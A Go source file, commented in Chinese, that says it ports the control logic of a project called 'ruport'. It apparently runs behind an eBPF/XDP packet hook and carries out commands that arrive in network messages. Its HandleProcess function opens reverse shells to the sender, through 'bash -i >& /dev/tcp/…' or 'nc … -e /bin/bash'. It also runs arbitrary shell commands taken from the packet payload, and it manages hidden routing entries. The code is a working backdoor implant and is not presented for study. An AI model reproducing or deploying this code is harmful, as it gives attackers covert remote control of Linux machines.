//go:build linux

// control 实现原 ruport 项目 ruport.c 中 control_router/control_process 的
// 指令处理逻辑：路由增删、反弹连接（bash/nc）、执行 shell 命令。
package control

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"sync"
	"syscall"

	"github.com/cilium/ebpf"

	"ruport-go/internal/bpf"
)

// procKey 对应原 FunctionNode 的 (cip, cport)，用于索引反弹子进程。
type procKey struct {
	cip   uint32
	cport uint16
}

// Controller 保存功能子进程信息，等价于原项目的 FunctionNode 链表。
type Controller struct {
	mu    sync.Mutex
	procs map[procKey]int
}

func New() *Controller {
	return &Controller{procs: make(map[procKey]int)}
}

// ntohs/ntohl 语义的字节序转换。
// map 中读出的 cip/cport 为网络字节序原始值（小端主机上读出的整型与其
// 内存字节相反），与内核侧保持同一份原始值作为 key，仅在展示/执行时转换。
func ip2str(ipv4 uint32) string {
	b := make(net.IP, 4)
	binary.LittleEndian.PutUint32(b, ipv4)
	return b.String()
}

func toHostPort(port uint16) uint16 {
	var b [2]byte
	binary.LittleEndian.PutUint16(b[:], port)
	return binary.BigEndian.Uint16(b[:])
}

// extString 取 ext 缓冲区中 NUL 结尾的字符串（对应原 strlen(msg->ext) 语义）。
func extString(ext []byte) string {
	for i, c := range ext {
		if c == 0 {
			return string(ext[:i])
		}
	}
	return string(ext)
}

// HandleRouter 根据消息操作路由表，等价于原 control_router()。
func (c *Controller) HandleRouter(msg *bpf.XdpMessage, routerMap *ebpf.Map) {
	hiByte := uint8(msg.Ins >> 8)
	loByte := uint8(msg.Ins)
	var router bpf.TcRouter

	key := uint64(msg.Cip)<<16 + uint64(msg.Cport)
	if hiByte > 0 { // 删除路由
		if err := routerMap.LookupAndDelete(key, &router); err == nil {
			log.Printf("delete a router: ip: %s, port: %d", ip2str(msg.Cip), toHostPort(router.Cport))
		}
		return
	}

	// 添加路由：已存在则跳过（对应原 bpf_map_lookup_elem 命中返回）
	var exist bpf.TcRouter
	if err := routerMap.Lookup(key, &exist); err == nil {
		return
	}

	log.Printf("insert a router: ip: %s, port: %d", ip2str(msg.Cip), toHostPort(msg.Cport))

	switch loByte {
	case 0x01:
		// 原代码 case 0x01 中 nativeport 为 0 时 break，否则 fallthrough 执行插入
		if msg.Nativeport == 0 {
			log.Print("the nativeport is needed.")
			return
		}
		c.insertRouter(routerMap, key, msg)
	case 0x02, 0x03:
		c.insertRouter(routerMap, key, msg)
	}
}

func (c *Controller) insertRouter(routerMap *ebpf.Map, key uint64, msg *bpf.XdpMessage) {
	router := bpf.TcRouter{
		Cip:        msg.Cip,
		Cport:      msg.Cport,
		Connport:   msg.Connport,
		Nativeport: msg.Nativeport,
	}
	if err := routerMap.Update(key, &router, ebpf.UpdateAny); err != nil {
		log.Printf("update router map failed: %v", err)
	}
}

// HandleProcess 根据指令执行动作，等价于原 control_process()。
func (c *Controller) HandleProcess(msg *bpf.XdpMessage) {
	hiByte := uint8(msg.Ins >> 8)
	loByte := uint8(msg.Ins)

	// 获取当前路径
	cwd, err := os.Getwd()
	if err != nil {
		return
	}

	pname := extString(msg.Ext[:])
	destip := ip2str(msg.Cip)
	destport := strconv.Itoa(int(toHostPort(msg.Cport)))

	switch loByte {
	case 0x01: // 不处理，只是添加路由
	case 0x02: // 反弹
		// kill
		if hiByte > 0 {
			c.killChild(msg.Cip, msg.Cport)
			return
		}

		switch pname {
		case "bash":
			log.Print("-----------------bash------------------")

			cmd := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", destip, destport)
			log.Printf("cmd: %s", cmd)

			// fork + execl 后父进程不等待、不记录 pid（与原版一致）
			if err := exec.Command("/bin/sh", "-c", cmd).Start(); err != nil {
				log.Printf("start bash failed: %v", err)
			}
		case "nc":
			log.Print("-----------------nc------------------")
			// nc 必须在和程序同一个目录
			cmd := exec.Command(filepath.Join(cwd, "nc"), destip, destport, "-e", "/bin/bash")
			if err := cmd.Start(); err != nil {
				log.Printf("start nc failed: %v", err)
				return
			}
			// 把子进程的数据记录（对应原 FunctionNode 链表）
			c.addChild(procKey{msg.Cip, msg.Cport}, cmd.Process.Pid)
		default:
			// 原版：未知反弹类型直接失败
		}
	case 0x03: // 执行shell命令
		log.Print("-----------------execute shell------------------")
		if err := exec.Command("/bin/sh", "-c", extString(msg.Ext[:])).Start(); err != nil {
			log.Printf("execute shell failed: %v", err)
		}
	case 0x04: // 执行程序（原版未实现，保持为空）
	}
}

func (c *Controller) addChild(key procKey, pid int) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.procs[key] = pid
}

// killChild 查找并 kill 对应反弹子进程（SIGINT），等价于原
// deleteFunctionNode + kill 逻辑。
func (c *Controller) killChild(cip uint32, cport uint16) {
	key := procKey{cip, cport}

	c.mu.Lock()
	pid, ok := c.procs[key]
	if ok {
		delete(c.procs, key)
	}
	c.mu.Unlock()

	if ok && pid > 0 {
		if err := syscall.Kill(pid, syscall.SIGINT); err != nil {
			log.Printf("kill child %d failed: %v", pid, err)
		}
	}
}
